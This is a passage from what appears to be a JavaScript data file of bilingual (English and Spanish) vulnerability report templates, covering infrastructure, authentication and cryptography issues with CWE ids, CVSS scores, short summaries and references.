        cwe: "CWE-1126",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
        overview_en: "### Summary\nAn unnecessary exposed service is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a misconfigured firewall or a service that is not properly secured.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nUn servicio expuesto innecesariamente es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un firewall mal configurado o un servicio que no está debidamente protegido.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-019"],
        tags: ["Infrastructure", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-046",
        title_en: "Misconfigured <APPLICATION> Instance",
        title_es: "Instancia de <APPLICATION> Mal Configurada",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nA misconfigured <APPLICATION> instance can allow an attacker to gain unauthorized access to a system. This is often the result of a misconfigured firewall or a service that is not properly secured.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nUna instancia de <APPLICATION> mal configurada puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un firewall mal configurado o un servicio que no está debidamente protegido.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-019"],
        tags: ["Infrastructure", "Configuration"],
        ...emptyVulnBoilerplate
    },

    // Authentication
    {
        id: "vuln-auth-047",
        title_en: "Weak Passwords",
        title_es: "Contraseñas Débiles",
        cwe: "CWE-521",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nWeak passwords are a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a weak password policy or a user that has chosen a weak password.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nLas contraseñas débiles son un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de una política de contraseñas débil o de un usuario que ha elegido una contraseña débil.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://owasp.org/www-community/vulnerabilities/Weak_password_requirements"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-048",
        title_en: "Password Reuse",
        title_es: "Reutilización de Contraseñas",
        cwe: "CWE-257",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nPassword reuse is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a user that has reused a password across multiple systems.\n\n---\n\n### Impact\nIf one system is compromised, an attacker can use the compromised credentials to gain access to other systems.",
        overview_es: "### Resumen\nLa reutilización de contraseñas es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un usuario que ha reutilizado una contraseña en varios sistemas.\n\n---\n\n### Impacto\nSi un sistema se ve comprometido, un atacante puede usar las credenciales comprometidas para obtener acceso a otros sistemas.",
        references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-002"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-049",
        title_en: "Missing Multi-Factor Authentication (MFA)",
        title_es: "Falta de Autenticación Multifactor (MFA)",
        cwe: "CWE-308",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nMissing MFA is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a system that does not support MFA or a user that has not enabled MFA.\n\n---\n\n### Impact\nAn attacker who has compromised a user's credentials can gain unauthorized access to a system without needing a second factor of authentication.",
        overview_es: "### Resumen\nLa falta de MFA es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un sistema que no admite MFA o de un usuario que no ha habilitado MFA.\n\n---\n\n### Impacto\nUn atacante que ha comprometido las credenciales de un usuario puede obtener acceso no autorizado a un sistema sin necesidad de un segundo factor de autenticación.",
        references: ["https://www.cisa.gov/mfa"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-050",
        title_en: "Session Hijacking",
        title_es: "Secuestro de Sesión",
        cwe: "CWE-384",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nSession hijacking is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of an attacker that has stolen a user's session cookie.\n\n---\n\n### Impact\nAn attacker can impersonate a legitimate user and gain unauthorized access to a system.",
        overview_es: "### Resumen\nEl secuestro de sesión es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un atacante que ha robado la cookie de sesión de un usuario.\n\n---\n\n### Impacto\nUn atacante puede hacerse pasar por un usuario legítimo y obtener acceso no autorizado a un sistema.",
        references: ["https://owasp.org/www-community/attacks/Session_hijacking_attack"],
        tags: ["Authentication", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-051",
        title_en: "Session Fixation",
        title_es: "Fijación de Sesión",
        cwe: "CWE-384",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nSession fixation is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of an application that does not properly invalidate a user's session after they have logged out.\n\n---\n\n### Impact\nAn attacker can force a user to use a session ID chosen by the attacker. If the user then authenticates, the attacker can use the same session ID to impersonate the user.",
        overview_es: "### Resumen\nLa fijación de sesión es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de una aplicación que no invalida correctamente la sesión de un usuario después de que ha cerrado la sesión.\n\n---\n\n### Impacto\nUn atacante puede obligar a un usuario a usar un ID de sesión elegido por el atacante. Si el usuario se autentica, el atacante puede usar el mismo ID de sesión para hacerse pasar por el usuario.",
        references: ["https://owasp.org/www-community/attacks/Session_fixation"],
        tags: ["Authentication", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-052",
        title_en: "Credential Stuffing",
        title_es: "Relleno de Credenciales",
        cwe: "CWE-1213",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nCredential stuffing is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a user that has reused a password across multiple systems.\n\n---\n\n### Impact\nAn attacker uses lists of compromised credentials to attempt to log in to other systems. If a user has reused a password, the attacker can gain unauthorized access to their account.",
        overview_es: "### Resumen\nEl relleno de credenciales es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un usuario que ha reutilizado una contraseña en varios sistemas.\n\n---\n\n### Impacto\nUn atacante usa listas de credenciales comprometidas para intentar iniciar sesión en otros sistemas. Si un usuario ha reutilizado una contraseña, el atacante puede obtener acceso no autorizado a su cuenta.",
        references: ["https://owasp.org/www-community/attacks/Credential_stuffing"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-053",
        title_en: "Insecure Password Recovery",
        title_es: "Recuperación Insegura de Contraseñas",
        cwe: "CWE-620",
        severity: "Medium",
        cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nAn insecure password recovery mechanism can allow an attacker to gain unauthorized access to a system. This is often the result of a password recovery mechanism that is not properly secured.\n\n---\n\n### Impact\nAn attacker can reset a user's password and gain unauthorized access to their account.",
        overview_es: "### Resumen\nUn mecanismo de recuperación de contraseña inseguro puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un mecanismo de recuperación de contraseña que no está debidamente protegido.\n\n---\n\n### Impacto\nUn atacante puede restablecer la contraseña de un usuario y obtener acceso no autorizado a su cuenta.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Identity_Management_Testing/05-Testing_for_Weak_Password_Recovery_Mechanisms"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-054",
        title_en: "User Enumeration",
        title_es: "Enumeración de Usuarios",
        cwe: "CWE-203",
        severity: "Low",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nUser enumeration is a type of vulnerability that allows an attacker to determine whether a user exists on a system. This is often the result of an application that provides different responses for valid and invalid usernames.\n\n---\n\n### Impact\nAn attacker can compile a list of valid usernames, which can then be used in further attacks such as password spraying or credential stuffing.",
        overview_es: "### Resumen\nLa enumeración de usuarios es un tipo de vulnerabilidad que permite a un atacante determinar si un usuario existe en un sistema. Esto suele ser el resultado de una aplicación que proporciona diferentes respuestas para nombres de usuario válidos e inválidos.\n\n---\n\n### Impacto\nUn atacante puede compilar una lista de nombres de usuario válidos, que luego se pueden usar en otros ataques como el rociado de contraseñas o el relleno de credenciales.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Identity_Management_Testing/03-Testing_for_User_Enumeration_and_Guessable_User_Accounts"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-055",
        title_en: "Weak Session Management",
        title_es: "Gestión Débil de Sesiones",
        cwe: "CWE-384",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nA weak session management mechanism can allow an attacker to gain unauthorized access to a system. This is often the result of a session management mechanism that is not properly secured.\n\n---\n\n### Impact\nAn attacker can hijack a user's session and gain unauthorized access to their account.",
        overview_es: "### Resumen\nUn mecanismo de gestión de sesiones débil puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un mecanismo de gestión de sesiones que no está debidamente protegido.\n\n---\n\n### Impacto\nUn atacante puede secuestrar la sesión de un usuario y obtener acceso no autorizado a su cuenta.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema"],
        tags: ["Authentication", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-056",
        title_en: "Brute Force Attacks",
        title_es: "Ataques de Fuerza Bruta",
        cwe: "CWE-307",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nA brute force attack is a type of attack where an attacker attempts to guess a user's password by trying many different combinations. This is often the result of a weak password policy or a lack of account lockout.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a user's account.",
        overview_es: "### Resumen\nUn ataque de fuerza bruta es un tipo de ataque en el que un atacante intenta adivinar la contraseña de un usuario probando muchas combinaciones diferentes. Esto suele ser el resultado de una política de contraseñas débil o la falta de bloqueo de cuentas.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a la cuenta de un usuario.",
        references: ["https://owasp.org/www-community/attacks/Brute_force_attack"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-057",
        title_en: "Weak <APPLICATION> Admin Credentials",
        title_es: "Credenciales Débiles de Administrador en <APPLICATION>",
        cwe: "CWE-521",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nWeak <APPLICATION> admin credentials are a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a weak password policy or a user that has chosen a weak password.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nLas credenciales de administrador débiles de <APPLICATION> son un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de una política de contraseñas débil o de un usuario que ha elegido una contraseña débil.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://owasp.org/www-community/vulnerabilities/Weak_password_requirements"],
        tags: ["Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-058",
        title_en: "Excessive Active Directory Group Privileges",
        title_es: "Privilegios Excesivos en Grupos de Active Directory",
        cwe: "CWE-266",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nExcessive Active Directory group privileges are a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a misconfigured Active Directory group that has more privileges than it should.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nLos privilegios excesivos de grupo de Active Directory son un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un grupo de Active Directory mal configurado que tiene más privilegios de los que debería.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models"],
        tags: ["Authentication", "Active Directory"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-auth-059",
        title_en: "Passwords in AD User Description Field",
        title_es: "Contraseñas en Campo de Descripción de Usuario de AD",
        cwe: "CWE-312",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nStoring passwords in the AD user description field is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of a user that has stored a password in the AD user description field.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nAlmacenar contraseñas en el campo de descripción de usuario de AD es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de un usuario que ha almacenado una contraseña en el campo de descripción de usuario de AD.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://adsecurity.org/?p=2535"],
        tags: ["Authentication", "Active Directory", "Data"],
        ...emptyVulnBoilerplate
    },

    // Cryptography
    {
        id: "vuln-crypto-060",
        title_en: "Weak Encryption Algorithms",
        title_es: "Algoritmos de Cifrado Débiles",
        cwe: "CWE-327",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nUsing weak or outdated encryption algorithms (e.g., DES, RC4) can allow an attacker to decrypt sensitive data.\n\n---\n\n### Impact\nAn attacker can decrypt sensitive data, such as passwords, credit card numbers, or personal health information.",
        overview_es: "### Resumen\nEl uso de algoritmos de cifrado débiles o desactualizados (por ejemplo, DES, RC4) puede permitir que un atacante descifre datos sensibles.\n\n---\n\n### Impacto\nUn atacante puede descifrar datos sensibles, como contraseñas, números de tarjetas de crédito o información de salud personal.",
        references: ["https://www.nist.gov/publications/recommendation-transitioning-use-cryptographic-algorithms-and-key-lengths"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-061",
        title_en: "Insecure Key Management",
        title_es: "Gestión Insegura de Claves",
        cwe: "CWE-320",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nImproper management of cryptographic keys (e.g., hardcoded keys, weak key generation, not rotating keys) can allow an attacker to compromise the entire cryptographic system.\n\n---\n\n### Impact\nAn attacker can gain access to encrypted data, impersonate users, or disrupt services.",
        overview_es: "### Resumen\nLa gestión inadecuada de las claves criptográficas (p. ej., claves codificadas, generación de claves débiles, no rotación de claves) puede permitir que un atacante comprometa todo el sistema criptográfico.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso a datos cifrados, hacerse pasar por usuarios o interrumpir servicios.",
        references: ["https://owasp.org/www-project-cryptographic-storage-cheat-sheet/"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-062",
        title_en: "Use of Hardcoded Secrets",
        title_es: "Uso de Secretos Embebidos",
        cwe: "CWE-798",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nStoring secrets like API keys, passwords, or encryption keys directly in the source code or configuration files makes them easily accessible to anyone with access to the codebase.\n\n---\n\n### Impact\nAn attacker can easily find and use these secrets to gain unauthorized access to systems or data.",
        overview_es: "### Resumen\nAlmacenar secretos como claves de API, contraseñas o claves de cifrado directamente en el código fuente o en los archivos de configuración los hace fácilmente accesibles para cualquiera que tenga acceso a la base de código.\n\n---\n\n### Impacto\nUn atacante puede encontrar y usar fácilmente estos secretos para obtener acceso no autorizado a sistemas o datos.",
        references: ["https://cwe.mitre.org/data/definitions/798.html"],
        tags: ["Cryptography", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-063",
        title_en: "Insufficient Entropy",
        title_es: "Entropía Insuficiente",
        cwe: "CWE-331",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nUsing a source of randomness with insufficient entropy for cryptographic operations can make the resulting values (e.g., keys, session tokens) predictable.\n\n---\n\n### Impact\nAn attacker may be able to predict cryptographic keys, session tokens, or other security-critical values, leading to compromise.",
        overview_es: "### Resumen\nEl uso de una fuente de aleatoriedad con entropía insuficiente para operaciones criptográficas puede hacer que los valores resultantes (p. ej., claves, tokens de sesión) sean predecibles.\n\n---\n\n### Impacto\nUn atacante puede predecir claves criptográficas, tokens de sesión u otros valores críticos para la seguridad, lo que lleva a un compromiso.",
        references: ["https://cwe.mitre.org/data/definitions/331.html"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-064",
        title_en: "Padding Oracle Attacks",
        title_es: "Ataques de Oráculo de Relleno",
        cwe: "CWE-327",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nA padding oracle attack is a type of attack that allows an attacker to decrypt encrypted data without knowing the encryption key. This is often the result of an application that provides different error messages for valid and invalid padding.\n\n---\n\n### Impact\nAn attacker can decrypt previously encrypted data, compromising confidentiality.",
        overview_es: "### Resumen\nUn ataque de oráculo de relleno es un tipo de ataque que permite a un atacante descifrar datos cifrados sin conocer la clave de cifrado. Esto suele ser el resultado de una aplicación que proporciona diferentes mensajes de error para el relleno válido e inválido.\n\n---\n\n### Impacto\nUn atacante puede descifrar datos previamente cifrados, comprometiendo la confidencialidad.",
        references: ["https://owasp.org/www-community/attacks/Padding_Oracle_Attack"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-065",
        title_en: "Weak Random Number Generation",
        title_es: "Generación Débil de Números Aleatorios",
        cwe: "CWE-338",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nUsing a weak or predictable random number generator for cryptographic operations can make the resulting values (e.g., keys, session tokens) predictable.\n\n---\n\n### Impact\nAn attacker may be able to predict cryptographic keys, session tokens, or other security-critical values, leading to compromise.",
        overview_es: "### Resumen\nEl uso de un generador de números aleatorios débil o predecible para operaciones criptográficas puede hacer que los valores resultantes (p. ej., claves, tokens de sesión) sean predecibles.\n\n---\n\n### Impacto\nUn atacante puede predecir claves criptográficas, tokens de sesión u otros valores críticos para la seguridad, lo que lleva a un compromiso.",
        references: ["https://cwe.mitre.org/data/definitions/338.html"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-066",
        title_en: "Cryptographic Flaws in Design",
        title_es: "Defectos Criptográficos en el Diseño",
        cwe: "CWE-310",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nThis category covers all the ways that cryptography can be done wrong in the design of a system. This could be using the wrong algorithm for a given purpose, or using cryptography in a way that does not provide the intended security guarantees.\n\n---\n\n### Impact\nAn attacker can bypass cryptographic controls and gain unauthorized access to data or functionality.",
        overview_es: "### Resumen\nEsta categoría cubre todas las formas en que la criptografía se puede hacer mal en el diseño de un sistema. Esto podría ser el uso del algoritmo incorrecto para un propósito determinado, o el uso de la criptografía de una manera que no proporciona las garantías de seguridad previstas.\n\n---\n\n### Impacto\nUn atacante puede eludir los controles criptográficos y obtener acceso no autorizado a datos o funcionalidades.",
        references: ["https://www.nist.gov/programs-projects/cryptographic-algorithm-validation-program"],
        tags: ["Cryptography", "Design"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-067",
        title_en: "Side-Channel Attacks",
        title_es: "Ataques de Canal Lateral",
        cwe: "CWE-208",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nA side-channel attack is a type of attack that allows an attacker to gain information about a system by observing its physical characteristics. This can include information about the system's power consumption, electromagnetic emissions, or timing of operations.\n\n---\n\n### Impact\nAn attacker can gain information about a system that they are not authorized to have, which can be used to launch further attacks.",
        overview_es: "### Resumen\nUn ataque de canal lateral es un tipo de ataque que permite a un atacante obtener información sobre un sistema observando sus características físicas. Esto puede incluir información sobre el consumo de energía del sistema, las emisiones electromagnéticas o el tiempo de las operaciones.\n\n---\n\n### Impacto\nUn atacante puede obtener información sobre un sistema que no está autorizado a tener, que se puede utilizar para lanzar más ataques.",
        references: ["https://owasp.org/www-community/attacks/Side_Channel_Attack"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-068",
        title_en: "Certificate Validation Bypass",
        title_es: "Omisión de Validación de Certificados",
        cwe: "CWE-295",
        severity: "High",
        cvss: { score: 7.4, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "H" },
        overview_en: "### Summary\nA certificate validation bypass vulnerability allows an attacker to impersonate a legitimate server. This is often the result of an application that does not properly validate a server's SSL/TLS certificate.\n\n---\n\n### Impact\nAn attacker can perform a man-in-the-middle attack and intercept, modify, or inject traffic.",
        overview_es: "### Resumen\nUna vulnerabilidad de omisión de validación de certificados permite a un atacante hacerse pasar por un servidor legítimo. Esto suele ser el resultado de una aplicación que no valida correctamente el certificado SSL/TLS de un servidor.\n\n---\n\n### Impacto\nUn atacante puede realizar un ataque de intermediario e interceptar, modificar o inyectar tráfico.",
        references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication"],
        tags: ["Cryptography", "Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-crypto-069",
        title_en: "Insecure SSL/TLS Configuration",
        title_es: "Configuración Insegura de SSL/TLS",
        cwe: "CWE-326",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nAn insecure SSL/TLS configuration can allow an attacker to decrypt sensitive data. This can include using weak cipher suites, outdated protocols, or not enabling Perfect Forward Secrecy.\n\n---\n\n### Impact\nAn attacker can decrypt sensitive data, such as passwords, credit card numbers, or personal health information.",
        overview_es: "### Resumen\nUna configuración SSL/TLS insegura puede permitir que un atacante descifre datos sensibles. Esto puede incluir el uso de conjuntos de cifrado débiles, protocolos obsoletos o no habilitar Perfect Forward Secrecy.\n\n---\n\n### Impacto\nUn atacante puede descifrar datos sensibles, como contraseñas, números de tarjetas de crédito o información de salud personal.",
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"],
        tags: ["Cryptography", "Network", "Configuration"],
        ...emptyVulnBoilerplate
    },

    // Additional
    {
        id: "vuln-add-070",
        title_en: "Buffer Overflow",
        title_es: "Desbordamiento de Búfer",
        cwe: "CWE-120",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
